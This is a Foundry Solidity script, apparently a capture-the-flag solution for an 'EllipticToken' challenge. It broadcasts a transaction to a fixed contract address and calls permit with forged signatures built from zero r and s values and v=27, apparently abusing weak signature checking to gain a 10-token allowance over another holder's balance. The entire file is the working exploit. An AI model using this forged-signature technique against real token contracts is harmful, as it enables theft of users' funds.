// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import {Script, console} from "forge-std/Script.sol";
import { EllipticToken } from "../src/EllipticToken.sol";

contract EllipticTokenSolver is Script {
	
	EllipticToken public instance = EllipticToken(0x6369b35164778A08d1BC374599330EAEc30e794b);

	uint256 prv = vm.envUint("PRV");
	address me = vm.envAddress("PUB");

	function run () external {

		vm.startBroadcast(prv);


		address aliceAddr = 0xA11CE84AcB91Ac59B0A4E2945C9157eF3Ab17D4e;

		console.log(instance.owner());
		console.logBytes32(bytes32(instance.balanceOf(me)));
		console.logBytes32(bytes32(instance.balanceOf(aliceAddr)));


		bytes memory tokenOwnerSignature = bytes.concat(
			bytes32(uint256(0)),
			bytes32(uint256(0)),
			bytes1(uint8(27))
 		);
		bytes memory spenderSignature = bytes.concat(
			bytes32(uint256(0)),
			bytes32(uint256(0)),
			bytes1(uint8(27))
 		);
		instance.permit(10000000000000000000, me, tokenOwnerSignature, spenderSignature);

		vm.stopBroadcast();


	}

}
